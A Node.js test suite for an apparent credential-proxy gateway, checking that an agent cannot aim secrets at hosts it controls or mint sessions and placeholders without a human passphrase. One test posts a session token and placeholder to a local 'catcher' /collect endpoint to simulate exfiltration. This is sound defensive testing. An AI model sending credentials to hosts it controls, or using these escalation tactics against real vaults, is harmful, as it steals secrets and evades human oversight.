// The eight exfil cases, each on its own. A caller who can reach the control
// socket still cannot point a credential at a host they run.
import { describe, test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import { rustSkipReason, openWorld, gateway, leaksSecret, SECRET, PASSPHRASE } from './lib/harness.js'

function startCatcher() {
  const captured = []
  const server = createServer((req, res) => {
    const chunks = []
    req.on('data', (c) => chunks.push(c))
    req.on('end', () => {
      captured.push(`${req.method} ${req.url}\n${JSON.stringify(req.headers)}\n${Buffer.concat(chunks).toString('utf8')}`)
      res.end('{}')
    })
  })
  return new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(0, '127.0.0.1', () => {
      resolve({
        port: server.address().port,
        captured,
        close: () => new Promise((r) => server.close(r)),
      })
    })
  })
}

const skip = rustSkipReason()
if (skip) {
  test('exfil', { skip }, () => {})
} else {
  describe('exfil', { concurrency: false, timeout: 180_000 }, () => {
    let w
    before(async () => { w = await openWorld() })
    after(async () => { await w?.close() })

    test('the control socket refuses a session aimed at a host the credential does not permit', async () => {
      const added = await w.control('POST', '/v1/credentials', {
        slug: 'remote', kind: 'http', host: 'api.example.test', scheme: 'https',
        value: SECRET, sites: ['header:authorization:Bearer'],
      })
      assert.equal(added.status, 200, added.text)
      const res = await w.control('POST', '/v1/sessions', {
        cred: 'remote', hosts: ['127.0.0.1'], methods: ['GET'], paths: ['/**'], approval: 'auto', budget: 10,
      })
      assert.equal(res.status, 403)
      assert.equal(res.json.code, 'AV_POLICY_DENIED')
      assert.match(res.json.detail, /outside what credential permits/)
      assert.equal(leaksSecret(res.text), null)
    })

    test('a session confined to the credential host cannot then be pointed elsewhere', async () => {
      const catcher = await startCatcher()
      try {
        const made = await w.control('POST', '/v1/sessions', {
          cred: 'remote', methods: ['GET'], paths: ['/**'], approval: 'auto', budget: 10,
        })
        assert.equal(made.status, 200, made.text)
        const res = await gateway(w, `/t/http/127.0.0.1:${catcher.port}/x`, {
          token: made.json.token, placeholder: made.json.placeholder,
        })
        assert.equal(res.status, 403)
        assert.equal(res.json.code, 'AV_NO_GRANT')
        assert.equal(catcher.captured.length, 0)
        assert.equal(leaksSecret(res.text), null)
      } finally {
        await catcher.close()
      }
    })

    test('the real credential value never reaches a caller-controlled destination', async () => {
      const own = await openWorld()
      const catcher = await startCatcher()
      try {
        const added = await own.control('POST', '/v1/credentials', {
          slug: 'remote', kind: 'http', host: 'api.example.test', scheme: 'https',
          value: SECRET, sites: ['header:authorization:Bearer'],
        })
        assert.equal(added.status, 200, added.text)
        const phrase = await own.control('POST', '/v1/passphrase', { passphrase: PASSPHRASE })
        assert.equal(phrase.status, 200, phrase.text)
        const made = await own.control('POST', '/v1/sessions', {
          cred: 'remote', methods: ['GET', 'POST'], paths: ['/**'], approval: 'auto', budget: 10,
          presence: { passphrase: PASSPHRASE },
        })
        assert.equal(made.status, 200, made.text)
        for (const method of ['GET', 'POST']) {
          const res = await gateway(own, `/t/http/127.0.0.1:${catcher.port}/x`, {
            method,
            token: made.json.token,
            placeholder: made.json.placeholder,
            headers: method === 'POST' ? { 'content-type': 'application/json' } : {},
            body: method === 'POST' ? JSON.stringify({ token: made.json.placeholder }) : undefined,
          })
          assert.equal(res.status, 403, `${method} ${res.text}`)
          assert.equal(res.json.code, 'AV_NO_GRANT')
          assert.equal(leaksSecret(res.text), null)
        }
        const direct = await fetch(`http://127.0.0.1:${catcher.port}/collect`, {
          method: 'POST',
          headers: { authorization: `Bearer ${made.json.placeholder}`, 'av-session': made.json.token },
          body: JSON.stringify(made.json),
        })
        assert.equal(direct.status, 200)
        assert.equal(catcher.captured.length, 1)
        assert.ok(catcher.captured[0].includes(made.json.placeholder))
        assert.equal(catcher.captured.some((c) => c.includes(SECRET)), false)
      } finally {
        await catcher.close()
        await own.close()
      }
    })

    test('without a passphrase, widening is open and audited', async () => {
      const res = await w.control('POST', '/v1/sessions', {
        cred: 'remote', methods: ['GET'], paths: ['/**'],
      })
      assert.equal(res.status, 200, res.text)
      const audit = await w.control('GET', '/v1/audit?limit=50')
      assert.equal(audit.status, 200)
      assert.ok(audit.json.some((r) => r.kind === 'control.widening_ungated'))
      assert.equal(leaksSecret(audit.text), null)
    })

    test('with a passphrase set, the socket cannot unlock without it', async () => {
      const set = await w.control('POST', '/v1/passphrase', { passphrase: PASSPHRASE })
      assert.equal(set.status, 200, set.text)
      const locked = await w.control('POST', '/v1/lock', {})
      assert.equal(locked.status, 200, locked.text)
      const noSecret = await w.control('POST', '/v1/unlock', {})
      assert.equal(noSecret.status, 423)
      assert.equal(noSecret.json.code, 'AV_LOCKED')
      const wrong = await w.control('POST', '/v1/unlock', { passphrase: 'guess-wrong' })
      assert.equal(wrong.status, 423)
      assert.equal(wrong.json.code, 'AV_LOCKED')
      const right = await w.control('POST', '/v1/unlock', { passphrase: PASSPHRASE })
      assert.equal(right.status, 200, right.text)
      assert.equal(right.json.locked, false)
      const removed = await w.control('POST', '/v1/passphrase', { action: 'remove', current: PASSPHRASE })
      assert.equal(removed.status, 403)
      assert.equal(removed.json.rule, 'last_factor')
      assert.equal(leaksSecret(right.text + removed.text), null)
    })

    test('with a passphrase set, an agent cannot mint capability without it', async () => {
      const changed = await w.control('POST', '/v1/passphrase', {
        passphrase: 'gate-passphrase-1', current: PASSPHRASE,
      })
      assert.equal(changed.status, 200, changed.text)
      const denied = await w.control('POST', '/v1/credentials', {
        slug: 'y', kind: 'http', host: 'api.example.test', value: 'not-a-real-value',
      })
      assert.equal(denied.status, 401)
      assert.equal(denied.json.code, 'AV_PRESENCE_REQUIRED')
      const deniedSession = await w.control('POST', '/v1/sessions', {
        cred: 'remote', methods: ['GET'], paths: ['/**'],
      })
      assert.equal(deniedSession.status, 401)
      assert.equal(deniedSession.json.code, 'AV_PRESENCE_REQUIRED')
      const wrong = await w.control('POST', '/v1/presence/window', { passphrase: 'nope-nope' })
      assert.equal(wrong.status, 403)
      assert.equal(wrong.json.code, 'AV_PRESENCE_DENIED')
      const opened = await w.control('POST', '/v1/presence/window', { passphrase: 'gate-passphrase-1' })
      assert.equal(opened.status, 200, opened.text)
      const ok = await w.control('POST', '/v1/sessions', {
        cred: 'remote', methods: ['GET'], paths: ['/**'],
      })
      assert.equal(ok.status, 200, ok.text)
      assert.equal(leaksSecret(ok.text), null)
    })

    test('an agent cannot mint a placeholder against a grant it does not own', async () => {
      const own = await openWorld()
      try {
        const added = await own.control('POST', '/v1/credentials', {
          slug: 'prod', kind: 'http', host: `127.0.0.1:${own.upstream.port}`, scheme: 'http',
          value: SECRET, sites: ['header:authorization:Bearer'],
        })
        assert.equal(added.status, 200, added.text)
        const made = await own.control('POST', '/v1/sessions', {
          cred: 'prod', methods: ['GET'], paths: ['/**'], budget: 9, approval: 'auto',
        })
        assert.equal(made.status, 200, made.text)
        const phrase = await own.control('POST', '/v1/passphrase', { passphrase: PASSPHRASE })
        assert.equal(phrase.status, 200, phrase.text)
        const session = await own.control('POST', '/v1/sessions', { cred: 'prod' })
        assert.equal(session.status, 401)
        const ph = await own.control('POST', '/v1/placeholders', { cred: 'prod' })
        assert.equal(ph.status, 401, ph.text)
        assert.equal(ph.json.code, 'AV_PRESENCE_REQUIRED')
        assert.equal(ph.json.placeholder, undefined)
        assert.equal(own.upstream.hits.length, 0)
        assert.equal(leaksSecret(ph.text), null)
      } finally {
        await own.close()
      }
    })

    test('a human with a presence window can still issue placeholders', async () => {
      const own = await openWorld()
      try {
        const added = await own.control('POST', '/v1/credentials', {
          slug: 'prod', kind: 'http', host: 'api.example.test', scheme: 'https',
          value: SECRET, sites: ['header:authorization:Bearer'],
        })
        assert.equal(added.status, 200, added.text)
        const made = await own.control('POST', '/v1/sessions', {
          cred: 'prod', label: 'the human', methods: ['GET'], paths: ['/**'], budget: 9,
        })
        assert.equal(made.status, 200, made.text)
        const phrase = await own.control('POST', '/v1/passphrase', { passphrase: PASSPHRASE })
        assert.equal(phrase.status, 200, phrase.text)
        const opened = await own.control('POST', '/v1/presence/window', { passphrase: PASSPHRASE })
        assert.equal(opened.status, 200, opened.text)
        const ph = await own.control('POST', '/v1/placeholders', { cred: 'prod', sid: made.json.session_id })
        assert.equal(ph.status, 200, ph.text)
        assert.match(ph.json.placeholder, /^av1\./)
        assert.equal(leaksSecret(ph.text), null)
      } finally {
        await own.close()
      }
    })
  })
}
